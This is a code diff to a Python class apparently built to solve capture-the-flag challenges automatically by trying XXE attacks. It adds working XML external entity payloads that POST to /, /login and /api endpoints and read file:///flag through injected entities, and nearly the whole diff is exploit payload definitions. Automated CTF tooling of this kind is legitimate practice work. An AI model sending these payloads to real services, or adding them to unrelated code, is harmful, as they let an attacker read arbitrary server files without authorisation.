@@ -121,6 +121,16 @@ class XXEMachine(RouteStateMachine):
                 "headers": {"Content-Type": "application/xml"},
                 "extract_flag": True,
             },
+            # Read /flag via user/username XML structure (common login form XXE)
+            {
+                "name": "xxe_login_user_flag",
+                "description": "XXE in user/username XML login",
+                "method": "POST",
+                "path": "/",
+                "data": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]><user><username>&xxe;</username><password>test</password></user>',
+                "headers": {"Content-Type": "application/xml"},
+                "extract_flag": True,
+            },
             # Read /flag.txt
             {
                 "name": "xxe_flag_txt",
@@ -151,13 +161,23 @@ class XXEMachine(RouteStateMachine):
                 "headers": {"Content-Type": "application/xml"},
                 "extract_flag": True,
             },
-            # Login form XXE
+            # Login form XXE on /login path
             {
                 "name": "xxe_login_form",
                 "description": "XXE in login XML body",
                 "method": "POST",
                 "path": "/login",
                 "data": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]><user><username>&xxe;</username><password>test</password></user>',
+                "headers": {"Content-Type": "application/xml"},
+                "extract_flag": True,
+            },
+            # API endpoint XXE
+            {
+                "name": "xxe_api",
+                "description": "XXE on /api endpoint",
+                "method": "POST",
+                "path": "/api",
+                "data": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]><request><data>&xxe;</data></request>',
                 "headers": {"Content-Type": "application/xml"},
                 "extract_flag": True,
             },
